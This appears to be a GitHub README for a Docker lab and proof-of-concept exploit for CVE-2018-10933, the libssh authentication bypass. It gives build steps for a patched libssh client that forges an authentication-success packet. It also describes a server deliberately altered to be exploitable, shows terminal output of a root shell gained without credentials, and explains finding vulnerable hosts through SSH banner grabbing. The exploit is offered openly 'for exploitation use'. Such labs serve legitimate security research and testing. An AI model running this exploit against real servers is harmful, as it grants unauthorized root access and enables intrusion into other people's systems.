# CVE-2018-10933 
CVE-2018-10933 libssh authentication bypass, a vulnerable Docker container that listens on port 2222
for exploitation. A basic proof-of-concept libssh patch included in the container to bypass auth. To login
use the default "myuser" / "mypassword" from libssh. A patch is applied to a copy of libssh in 
the Docker container which injects a SSH2_MSG_USERAUTH_SUCCESS packet during any authentication 
(keyboard-interactive / pubkey / gss-api etc.) attempt and sets the client side state to proceed. The
included server has been patched from example code to allow exploitation to succeed.

```
./build.sh
./run.sh
ssh -l myuser -p 2222 localhost
```

A patched exploit-libssh-0.8.3 and vulnerable sshd are available in the container for testing purposes.
The "ssh-client" will successfully bypass authentication but is unable to spawn a shell against the
default example server due to additional authentication checks in the server code. 

``` 
[root@305b48cb932e ]# cd /root/exploit-libssh-0.8.3/build/examples
[root@305b48cb932e examples]# ./ssh-client -l root 127.0.0.1
The server is unknown. Do you trust the host key (yes/no)?
SHA256:Mg6j2yHWMsRe56ABhAYjLIJK9yD2N3lGQAl3EfGqP7w
yes
This new key will be written on disk for further usage. do you agree ?
yes
Requesting shell : Channel request shell failed
[root@305b48cb932e examples]# 
```

From the advisory "malicious client could create channels without first performing authentication, resulting in unauthorized access."

The following libssh debug output shows authentication has succeeded on the server and a session
channel has been created. The host is now authenticated but additional server side checks prevent
commands being executed. An attacker could still attempt to tunnel/proxy connections through
the service.

```
[2018/10/19 01:26:24.929187, 3] ssh_packet_process:  Dispatching handler for packet type 52
[2018/10/19 01:26:24.929228, 3] ssh_packet_userauth_success:  Authentication successful
[2018/10/19 01:26:24.971901, 3] ssh_packet_socket_callback:  packet: read type 90 [len=44,padding=19,comp=24,payload=24]
[2018/10/19 01:26:24.971984, 3] ssh_packet_process:  Dispatching handler for packet type 90
[2018/10/19 01:26:24.972012, 3] ssh_packet_channel_open:  Clients wants to open a session channel
[2018/10/19 01:26:24.972057, 3] ssh_message_channel_request_open_reply_accept_channel:  Accepting a channel request_open for chan 43
[2018/10/19 01:26:24.972193, 3] ssh_socket_unbuffered_write:  Enabling POLLOUT for socket
[2018/10/19 01:26:24.972233, 3] packet_send2:  packet: wrote [len=28,padding=10,comp=17,payload=17]
```

Attempts to launch shells / exec or pty result in a successful session but errors on the example server due to an additional
checks on the user authentication state. The following errors are shown on the example server.

```
[2018/10/19 03:33:56.539864, 3] ssh_message_handle_channel_request:  Received a shell channel_request for channel (43:0) (want_reply=1)
[2018/10/19 03:33:56.539899, 3] ssh_message_channel_request_reply_default:  Sending a default channel_request denied to channel 0
```

It is still possible for bespoke libssh servers to potentially result in arbitrary code execution
but the majority may only allow tunneling or some misuse of SSH protocol. By removing the additional authentication check
the server is now vulnerable to the authentication bypass exploit. It is possible for a server side libssh implementation
to introduce this vulnerability. Example of a successful exploitation using patched libssh below.

```
[root@3a184714fd21]# cd /root/exploit-libssh-0.8.3/build/examples
[root@3a184714fd21 examples]# ./ssh-client -l root 127.0.0.1
The server is unknown. Do you trust the host key (yes/no)?
SHA256:DyYf8l6tjNc0kyUe5uE/Rt8vHI1SuhsVGbzOonzPlaY
yes
This new key will be written on disk for further usage. do you agree ?
yes
[root@3a184714fd21 /]# id
uid=0(root) gid=0(root) groups=0(root)
```

The Docker container will run the vulnerable "ssh_server_fork" example by default, the original can be found
in "libssh-0.8.3" directory for testing/debugging purposes. 

# Impacted Vendors
The following vendors appear to be practically impacted by this flaw due to their use of libssh.

* F5 https://support.f5.com/csp/article/K52868493
* Redhat https://access.redhat.com/security/cve/cve-2018-10933

libssh is installed locally on a number of *BSD & Linux distributions as is used by ffmpeg (?), hydra
and a small number of FOSS packages. 

# Exploit
You can build a patched libssh client from this repo for exploitation use.

```
git clone https://github.com/hackerhouse-opensource/cve-2018-10933
cd cve-2018-10933
xz -d libssh-0.8.3.tar.xz
tar -xvf libssh-0.8.3.tar
cd libssh-0.8.3
patch -p0 < ../cve-2018-10933.patch
mkdir build
cd build
cmake ..
make
```

You can then use "ssh-client" and any examples to bypass authentication on affected libssh server 
implementations.

```
$ ./ssh-client -l root 127.0.0.1 -p 2222
[root@8fec78903da2 /]# id
uid=0(root) gid=0(root) groups=0(root)
```

# Identification

Scanning for potentially vulnerable hosts can be performed simply by doing regular banner
grabbing on affected SSH ports (e.g. nmap). 
```
SSH-2.0-libssh_0.8.3
```

# Credits
The original advisory is in CVE-2018-10933.txt, vulnerability found by Peter Winter Smith. Vulnerable Docker
and libssh exploit patch released by Hacker House (https://hacker.house). 
